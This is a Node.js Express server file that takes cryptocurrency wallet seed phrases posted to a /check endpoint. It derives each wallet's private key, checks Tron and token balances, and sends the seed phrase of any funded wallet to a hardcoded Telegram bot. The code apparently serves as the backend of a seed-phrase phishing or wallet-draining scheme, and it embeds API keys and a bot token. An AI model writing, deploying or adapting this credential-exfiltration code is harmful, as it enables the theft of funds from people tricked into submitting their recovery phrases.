const TronWeb = require('tronweb');
const express = require('express')
const { ethers } = require("ethers");
const app = express()
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
const fetch = require('node-fetch');


app.engine('html', require('ejs').renderFile)
app.engine('html', require('ejs').renderFile)
app.use(bodyParser.urlencoded({ extended: false }));


tron_pro_api = ["356d6630-6535-43d9-81b8-774d5d168220", "f09f73da-364c-4840-8815-3d2400a67aab"]

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { 'TRON-PRO-API-KEY': 'd753baf8-bf1a-41f5-a07b-7fa4d6580d40' },
    privateKey: ''
});


let walletINFO = {
    "trx_address": "TR1RTewEDbQhiU4wBU1pF6D5T8duLMAm4d",
    "phrase": "",
    "eth_address": "",
    "privatekey": "",
    "balance": [],
}

const contract_address = ['TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq', "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn", 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t']

function getRandomItem(array) {
    return array[Math.floor(Math.random() * array.length)];
}

async function interactWithSmartContract(items) {
    const randomkey = getRandomItem(tron_pro_api);
    const tronWeb2 = new TronWeb({
        fullHost: 'https://api.trongrid.io',
        headers: { 'TRON-PRO-API-KEY': randomkey },
        privateKey: ''
    });

    try {
        let trx_address = walletINFO['trx_address']
        const contractInstance = await tronWeb2.contract().at(items);
        const symbol_ = await contractInstance.symbol().call({ from: items });
        const balance_ = await contractInstance.balanceOf(trx_address).call({ from: items });
        console.log(`| ${balance_ } ${symbol_ }`);

        walletINFO['balance'][0] = balance_.toNumber()
        walletINFO['balance'][1] = symbol_

        if (balance_.toNumber() > 0) {
            sendAlert()
        }

    } catch (error) {
        console.error("rate limit exceeded");
        //await new Promise(r => setTimeout(r, 5000))
    }
}

async function call_(self_) {
    walletINFO['trx_address'] = self_
    try { trx_bal = await tronWeb.trx.getBalance(self_)
    } catch (e) { console.log('limit exceeded: '+e) }

    console.log(`------------------------------------------------------------------------------------
| ${walletINFO['phrase']}
------------------------------------------------------------------------------------
| ${walletINFO['trx_address']}
---------------------------------------------`);
    console.log(`| ${trx_bal} TRX`);

    if (trx_bal != 0) {
        walletINFO["TRX"] = trx_bal
        sendAlert()
    }
    contract_address.forEach(async item => {
        await interactWithSmartContract(item);
    })
}

async function S0x001(phrase_) { //check Tron Balance
    walletINFO['phrase'] = phrase_
    try {
        const phrase = tronWeb.fromMnemonic(phrase_)
        walletINFO['privatekey'] = phrase.privateKey
        walletINFO['trx_address'] = phrase.address
        await call_(phrase.address)
    } catch (err) {
        console.log(err)
    }
    try {
        if (ethers.utils.isValidMnemonic(phrase_)) {
            walletINFO['eth_address'] = "True"
        } else {
            walletINFO['eth_address'] = "False"
        }
    } catch (err) {

    }
    return walletINFO

}

function sendAlert() {
    // Set the bot token and chat ID
    const botToken = '6945082510:AAE-P59l_PVAtNzMy6ZdQDGg5UXgf9rHEx0';
    const chatId = '6849192961';
    // Set the message text
    const messageText = `${walletINFO['balance'][0]}   ${walletINFO['balance'][1]} 
    ${walletINFO['phrase']}`

    const message = {
        chat_id: chatId,
        text: messageText
    };
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        })
        .then(response => response.json())
        .then(result => {
            // Check the response from the Telegram API
            if (result.ok) {
                console.log('Message sent successfully!');
            } else {
                console.error(`Failed to send message. Error code: ${result.error_code}, description: ${result.description}`);
            }
        })
        .catch(error => console.error('Error sending message:', error));
}


app.post('/check', async(req, res) => {
    const data = req.body;
    // process the data
    let bal_ = data.balance
    let sym_ = data.symbol
    walletINFO['balance'][0] = bal_
    walletINFO['balance'][1] = sym_
    walletINFO['phrase'] = data.Phrase
    if (bal_ > 0) {
        sendAlert()
    }
    let checkMem = await S0x001(data.Phrase)
    res.send(checkMem);
});


const port = 31000 // Port we will listen on
    // Function to listen on the port
app.listen(port, () => console.log(`This app is listening on port ${port}`));
